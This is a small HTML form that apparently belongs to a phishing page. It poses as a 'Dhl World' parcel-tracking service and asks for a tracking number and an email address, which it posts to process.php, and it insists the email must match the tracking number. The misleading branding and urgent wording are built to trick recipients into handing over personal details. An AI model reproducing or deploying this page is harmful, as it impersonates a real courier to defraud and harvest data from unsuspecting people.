<div class="form">
<p class="text-center"><h3>Dhl World<h3></p>
<form action="process.php" method="POST"name="loForm">
  <input type="text"  id="fname" name="fname" placeholder="Tracking number"/>
  <br>
 <input type="email"  id="fname" name="email" placeholder="Email-"><br>
 <small class="small"><em>-Check your confirmation email for tracking<em><br><em>-Email MUST match with tracking<em><br>-Only Email linked to tracking is valid</small><br><br>
  <input type="submit" class="button" id="button" value="Track">
</form> 
</div>
